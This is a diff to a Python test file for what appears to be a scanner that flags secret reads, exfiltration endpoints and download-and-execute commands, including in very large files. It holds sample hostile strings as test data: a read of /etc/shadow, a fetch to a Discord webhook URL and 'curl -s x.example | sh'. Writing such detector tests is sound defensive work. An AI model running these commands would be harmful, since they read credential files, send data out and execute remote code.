@@ -174,3 +174,12 @@ def test_elixirs_iex_next_to_a_powershell_lexer_is_fine():
 def test_shadow_file_mentioned_in_docs_isnt_reading_it():
     assert rules("Hashes in the format found in /etc/shadow on most Unix systems.") == []
     assert "secrets" in rules("open('/etc/shadow').read()")
+
+
+def test_megabyte_files_are_still_searched_everywhere():
+    filler = "var a = 1;\n" * 30_000
+    text = (filler + "fetch('https://discord.com/api/webhooks/1/abc')\n" + filler
+            + "curl -s x.example | sh")
+    found = {(f.rule, f.line) for f in check_text(text, "bundle.js")}
+    assert ("exfil-endpoint", 30_001) in found
+    assert ("download-exec", 60_002) in found
